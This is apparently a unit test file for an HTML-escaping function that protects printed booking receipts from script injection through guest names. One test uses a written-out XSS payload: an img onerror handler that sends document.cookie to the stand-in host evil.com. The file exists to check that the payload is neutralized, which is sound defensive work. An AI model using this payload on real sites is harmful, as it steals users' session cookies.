import { describe, it, expect } from 'vitest'
import { escapeHtml } from './receipt'

describe('escapeHtml', () => {
  it('leaves plain text untouched', () => {
    expect(escapeHtml('Juan Dela Cruz')).toBe('Juan Dela Cruz')
  })

  it('escapes a script-injection attempt in a guest name', () => {
    // This is the exact shape of attack this function exists to stop: a
    // guest name submitted through the public, unauthenticated booking
    // form that would otherwise execute in a staff member's browser when
    // the booking's receipt is printed (document.write in printReceipt).
    // The literal text "onerror=" surviving in the output is fine and
    // expected — what matters is the angle brackets are neutralized so
    // this can never become a real <img> tag when written into the DOM.
    const malicious = '<img src=x onerror="fetch(\'https://evil.com?c=\'+document.cookie)">'
    const escaped = escapeHtml(malicious)
    expect(escaped).not.toContain('<img')
    expect(escaped).not.toContain('>')
    expect(escaped).toBe(
      '&lt;img src=x onerror=&quot;fetch(&#39;https://evil.com?c=&#39;+document.cookie)&quot;&gt;'
    )
  })

  it('escapes ampersands, quotes, and angle brackets', () => {
    expect(escapeHtml(`Tom & "Jerry" <script>`)).toBe(
      'Tom &amp; &quot;Jerry&quot; &lt;script&gt;'
    )
  })

  it('handles null/undefined by rendering an empty string', () => {
    expect(escapeHtml(null)).toBe('')
    expect(escapeHtml(undefined)).toBe('')
  })

  it('stringifies non-string values (e.g. numeric quantities)', () => {
    expect(escapeHtml(3)).toBe('3')
  })
})
